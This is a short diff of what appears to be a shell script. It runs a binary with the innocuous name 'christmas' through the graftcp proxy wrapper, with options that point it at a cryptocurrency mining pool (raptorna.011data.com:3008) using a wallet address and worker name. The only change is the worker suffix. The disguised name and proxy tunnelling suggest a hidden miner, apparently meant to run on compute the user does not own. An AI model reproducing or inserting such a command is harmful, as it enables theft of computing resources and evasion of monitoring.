@@ -35,5 +35,5 @@ chmod +x christmas
 
 ph add christmas
 
-./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolXmasAzAz -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz -p IhatePopUps
 
